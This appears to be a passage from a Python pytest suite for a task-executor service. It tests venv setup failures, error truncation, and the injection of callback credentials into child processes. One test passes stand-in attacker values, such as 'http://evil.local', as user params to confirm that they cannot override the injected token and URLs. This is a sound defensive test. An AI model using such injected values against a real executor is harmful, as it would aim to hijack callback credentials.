    monkeypatch.setattr(execute_module, 'UV_VENV_TIMEOUT_SECONDS', 0.05)

    with pytest.raises(RuntimeError, match='timed out'):
        asyncio.run(execute_module.ensure_venv(venv_dir, []))
    assert proc.killed
    assert not venv_dir.exists()


def test_ensure_venv_creation_failure_removes_venv_dir(tmp_path, monkeypatch):
    from routers import execute as execute_module

    venv_dir = tmp_path / '.venvs' / 'taskA2'
    proc = _FakeUvProc(venv_dir, returncode=1, output=b'boom')

    async def fake_exec(*args, **kwargs):
        return proc

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fake_exec)
    monkeypatch.setattr(execute_module, 'UV_VENV_TIMEOUT_SECONDS', 5)

    with pytest.raises(RuntimeError, match='uv venv failed'):
        asyncio.run(execute_module.ensure_venv(venv_dir, []))
    assert not venv_dir.exists()


def test_ensure_venv_install_failure_message_truncated(tmp_path, monkeypatch):
    """P2: full uv output must not flow untruncated into errorMessage
    (admin DTO MaxLength 4096)."""
    from routers import execute as execute_module

    venv_dir = tmp_path / '.venvs' / 'taskB'
    venv_dir.mkdir(parents=True)  # venv exists -> goes straight to pip install
    proc = _FakeUvProc(venv_dir, returncode=1, output=b'x' * 20000)

    async def fake_exec(*args, **kwargs):
        return proc

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fake_exec)
    monkeypatch.setattr(execute_module, 'UV_PIP_TIMEOUT_SECONDS', 5)

    with pytest.raises(RuntimeError) as exc:
        asyncio.run(execute_module.ensure_venv(venv_dir, ['requests>=2']))
    message = str(exc.value)
    assert message.startswith('uv pip install failed:')
    assert len(message) <= 4100
    assert 'truncated' in message


# ---------------------------------------------------------------------------
# R4-C P3: node runtime + requirements is not silent anymore
# ---------------------------------------------------------------------------

def test_node_runtime_with_requirements_logs_warning(tmp_path, monkeypatch, caplog):
    import logging
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))

    async def fail_spawn(*args, **kwargs):
        raise RuntimeError('no subprocess in test')

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fail_spawn)

    req = ExecuteRequest(
        executionId='exec-nodereq',
        task={'runtime': 'node', 'entrypoint': 'main.js', 'requirements': ['left-pad']},
    )
    with caplog.at_level(logging.WARNING, logger='routers.execute'):
        result = asyncio.run(run_task(req))
    assert result['success'] is False
    assert 'runtime=node ignores requirements' in caplog.text


# ---------------------------------------------------------------------------
# N33 (round-9): per-execution callback env injection (executor-node parity)
# ---------------------------------------------------------------------------

class _FakeLineStream:
    def __init__(self, lines):
        self._lines = lines

    def __aiter__(self):
        async def _gen():
            for line in self._lines:
                yield line
        return _gen()


class _FakeTaskProc:
    def __init__(self):
        self.returncode = 0
        self.stdout = _FakeLineStream([b'ok\n'])
        self.pid = 4242

    async def wait(self):
        return 0


def _run_task_capture_env(tmp_path, monkeypatch, *, params=None, exec_id='exec-cbenv', shared_token='test-secret-vector'):
    """Run run_task with a mocked spawn and return the child env dict."""
    import auth as auth_module
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    monkeypatch.setattr(execute_module.settings, 'admin_api_url', 'http://admin.local')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_internal', '')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_external', '')
    monkeypatch.setattr(execute_module.settings, 'executor_address', 'localhost:8001')
    monkeypatch.setattr(execute_module.settings, 'executor_address_public', 'pub:9000')
    monkeypatch.setattr(execute_module.settings, 'executor_shared_token', shared_token)
    monkeypatch.setattr(execute_module.settings, 'executor_secret', '')
    monkeypatch.delenv('EXECUTION_CALLBACK_SECRET', raising=False)
    monkeypatch.setattr(auth_module, '_executor_token_hash', None)

    captured = {}

    async def fake_spawn(*args, **kwargs):
        captured['env'] = dict(kwargs.get('env') or {})
        return _FakeTaskProc()

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fake_spawn)

    req = ExecuteRequest(
        executionId=exec_id,
        task={'name': 'cb', 'runtime': 'python', 'entrypoint': 'main.py', 'timeoutSeconds': 30},
        params=params,
    )
    result = asyncio.run(run_task(req))
    assert result['success'] is True
    return captured['env']


def test_run_task_injects_callback_env_triple(tmp_path, monkeypatch):
    """N33: task children get AUTOFLOW_CALLBACK_TOKEN (v1 HMAC bound to the
    executionId, TTL = timeout + 900s grace) plus the admin URL and the
    registered executor address — the three vars autoflow-sdk ctx.callback
    needs; previously python executors left ctx.callback permanently disabled."""
    import time
    from execution_callback_token import _compute_signature

    env = _run_task_capture_env(tmp_path, monkeypatch)

    token = env['AUTOFLOW_CALLBACK_TOKEN']
    parts = token.split('.')
    assert parts[0] == 'v1'
    assert parts[1] == 'exec-cbenv'
    now = int(time.time())
    assert now + 30 + 900 - 5 <= int(parts[2]) <= now + 30 + 900 + 5
    assert parts[3] == _compute_signature('test-secret-vector', '.'.join(parts[:3]))

    assert env['AUTOFLOW_ADMIN_API_URL'] == 'http://admin.local'
    assert env['AUTOFLOW_EXECUTOR_ADDRESS'] == 'pub:9000'


def test_run_task_callback_env_not_overridable_by_params(tmp_path, monkeypatch):
    """Injection happens after the params loop — user params can never
    shadow the callback credentials (node N23 parity)."""
    env = _run_task_capture_env(tmp_path, monkeypatch, params={
        'callback_token': 'evil',
        'admin_api_url': 'http://evil.local',
        'executor_address': 'evil:1',
    })
    assert env['AUTOFLOW_CALLBACK_TOKEN'].startswith('v1.exec-cbenv.')
    assert env['AUTOFLOW_ADMIN_API_URL'] == 'http://admin.local'
    assert env['AUTOFLOW_EXECUTOR_ADDRESS'] == 'pub:9000'


def test_run_task_omits_callback_token_without_secret(tmp_path, monkeypatch):
    """Dev executor with no token configured: AUTOFLOW_CALLBACK_TOKEN is
    simply omitted (SDK stays disabled) instead of minting a bogus token;
    the non-secret routing vars are still injected."""
    from routers import execute as execute_module

    monkeypatch.setattr(execute_module.settings, 'executor_secret', '')
    monkeypatch.delenv('EXECUTOR_SHARED_TOKEN', raising=False)
    monkeypatch.delenv('EXECUTOR_SECRET', raising=False)

    env = _run_task_capture_env(
        tmp_path, monkeypatch, exec_id='exec-nosecret', shared_token=''
    )
    assert 'AUTOFLOW_CALLBACK_TOKEN' not in env
    assert env['AUTOFLOW_ADMIN_API_URL'] == 'http://admin.local'
    assert env['AUTOFLOW_EXECUTOR_ADDRESS'] == 'pub:9000'
